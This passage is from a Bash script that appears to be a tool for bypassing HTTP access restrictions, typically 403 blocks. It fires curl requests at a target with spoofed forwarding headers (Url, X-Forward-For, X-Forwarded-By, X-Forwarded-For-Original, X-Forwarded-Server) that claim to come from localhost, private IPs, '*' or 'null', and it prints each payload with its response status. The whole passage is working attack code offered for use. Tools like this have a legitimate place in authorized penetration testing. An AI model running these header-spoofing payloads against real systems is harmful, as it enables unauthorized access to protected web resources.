	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Url Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Url: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Forward-For Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forward-For Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forward-For: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Forwarded-By Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-By Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-By: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Forwarded-For-Original Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-For-Original Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-For-Original: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Forwarded-Server Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Server: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Server Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
